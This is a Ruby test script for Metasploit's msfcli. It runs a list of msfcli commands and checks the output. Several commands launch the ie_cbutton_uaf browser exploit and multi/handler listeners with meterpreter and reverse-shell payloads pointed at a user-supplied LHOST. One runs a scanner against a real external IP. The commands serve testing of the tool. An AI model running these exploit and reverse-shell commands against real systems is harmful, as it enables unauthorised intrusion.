#!/usr/bin/env ruby

##
#
# Test cases for msfcli
# Before using this, you need to modify your msfcli like to let to automatically exit
# after it's done loading.  At line 341, you should see:
#
# con.run_single("exploit")
#
# Modify that line to:
#
# con.run_single("exploit -j") 
# con.run_single("exit")
#
##


#
# Ask for LHOST
#
print "[*] Enter LHOST:"
lhost = gets.strip

if lhost.empty?
	puts "[*] I need a lhost"
	exit
end


#
# Test case keys:
# :description = Describe the test case
# :command     = The command to test
# :response    = A valid response you expect to see
#
test_cases = [
	{
		:description => "I should see a help menu and a list of modules",
		:command     => "msfcli",
		:response    => "Usage:"
	},
	{
		:description => "I should see a help menu",
		:command     => "msfcli -h",
		:response    => "Usage:"
	},
	{
		:description => "I should get an error saying my module is invalid",
		:command     => "msfcli RANDOMCRAP",
		:response    => "Error: Invalid module"
	},
	{
		:description => "I should get options for module windows/browser/ie_cbutton_uaf",
		:command     => "msfcli windows/browser/ie_cbutton_uaf O",
		:response    => "The URI to use for this exploit"
	},
	{
		:description => "I should be able to run windows/browser/ie_cbutton_uaf",
		:command     => "msfcli windows/browser/ie_cbutton_uaf payload=windows/meterpreter/reverse_tcp lhost=#{lhost} E",
		:response    => "Exploit running"
	},
	{
		:description => "I should be able to run http_version against metasploit.com (208.118.237.137)",
		:command     => "msfcli scanner/http/http_version rhosts=208.118.237.137 E",
		:response    => "Auxiliary module running"
	},
	{
		:description => "I should be able to start a multi/handler with windows/meterpreter/reverse_tcp",
		:command     => "msfcli multi/handler payload=windows/meterpreter/reverse_tcp lhost=#{lhost} E",
		:response    => "Exploit running"
	},
	{
		:description => "I should be able to start a multi/handler with windows/shell_reverse_tcp",
		:command     => "msfcli multi/handler payload=windows/shell_reverse_tcp lhost=#{lhost} E",
		:response    => "Exploit running"
	},
	{
		:description => "I should be able to start a multi/handler with windows/shell/reverse_tcp",
		:command     => "msfcli multi/handler payload=windows/shell/reverse_tcp lhost=#{lhost} E",
		:response    => "Exploit running"
	},
	{
		:description => "I should be able to start a multi/handler with php/meterpreter/reverse_tcp",
		:command     => "msfcli multi/handler payload=php/meterpreter/reverse_tcp lhost=#{lhost} E",
		:response    => "Exploit running"
	},
	{
		:description => "I should be able to start a multi/handler with cmd/unix/generic",
		:command     => "msfcli multi/handler payload=cmd/unix/generic cmd=id E",
		:response    => "Exploit running"
	},
	{
		:description => "I should be able to start multi/handler with bsd/x86/exec",
		:command     => "msfcli multi/handler payload=bsd/x86/exec cmd=id E",
		:response    => "Exploit running"
	},
	{
		:description => "I should be able to start a multi/handler with java/meterpreter/reverse_tcp",
		:command     => "msfcli multi/handler payload=java/meterpreter/reverse_tcp lhost=#{lhost} E",
		:response    => "Exploit running"
	},
	{
		:description => "I should be able to start a multi/handler with linux/x64/exec",
		:command     => "msfcli multi/handler payload=linux/x64/exec cmd=id E",
		:response    => "Exploit running"
	},
	{
		:description => "I should be able to start a multi/handler with linux/x86/meterpreter/reverse_tcp",
		:command     => "msfcli multi/handler payload=linux/x86/meterpreter/reverse_tcp lhost=#{lhost} E",
		:response    => "Exploit running"
	},
	{
		:description => "I should be able to start a multi/handler with linux/x86/shell_reverse_tcp",
		:command     => "msfcli multi/handler payload=linux/x86/shell_reverse_tcp lhost=#{lhost} E",
		:response    => "Exploit running"
	},
	{
		:description => "I should be able to start a multi/handler with windows/x64/shell_reverse_tcp",
		:command     => "msfcli multi/handler payload=windows/x64/shell_reverse_tcp lhost=#{lhost} E",
		:response    => "Exploit running"
	},
	{
		:description => "I should be able to start a multi/handler with windows/meterpreter/reverse_tcp with a x86/fnstenv_mov encoder",
		:command     => "msfcli multi/handler payload=windows/meterpreter/reverse_tcp lhost=#{lhost} encoder=x86/fnstenv_mov E",
		:response    => "Exploit running"
	},
	{
		:description => "I should get an error saying I have a bad encoder",
		:command     => "msfcli multi/handler payload=windows/exec cmd=id encoder=BADENCODER E",
		:response    => "No encoders encoded the buffer successfully"
	}
]


#
# Runs a command, checks the response, and returns a pass/fail message.
#
def test(opts)
	command     = opts[:command]
	response    = opts[:response]
	description = opts[:description]

	pass_msg = "\033[92mPass\033[0m"
	fail_msg = "\033[38mFail\033[0m"

	puts "[*] Test: #{description}"
	o = `#{command}`
	return (o =~ /#{response}/) ? pass_msg : fail_msg
end


#
# Run the test cases
#
pass_count = 0
fail_count = 0
puts "[*] Running #{test_cases.length.to_s} test scenarios for msfcli..."
test_cases.each do |c|
	result = test(c)
	puts "[*] Result: #{result}"
	if result =~ /Pass/
		pass_count += 1
	else
		fail_count += 1
	end
	puts
end
puts
puts "=" * 50
puts "[*] Finished #{test_cases.length.to_s} cases. #{pass_count.to_s} passed, #{fail_count.to_s} failed"